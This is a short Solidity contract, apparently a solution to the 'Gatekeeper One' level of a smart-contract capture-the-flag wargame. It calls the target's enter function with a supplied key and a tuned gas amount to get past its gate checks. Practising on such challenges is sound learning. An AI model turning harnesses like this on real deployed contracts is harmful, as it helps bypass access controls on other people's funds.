// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./13-GatekeeperOne.sol";

contract GatekeeperOneAttacker {
    GatekeeperOne public gatekeeperOne;

    constructor(address _gatekeeperOneAddress) public {
        gatekeeperOne = GatekeeperOne(_gatekeeperOneAddress);
    }

    function attack(bytes8 _gateKey, uint256 gasToUse) external payable {
        bool confirm = gatekeeperOne.enter{gas: gasToUse}(_gateKey);
        require(confirm);
    }
}
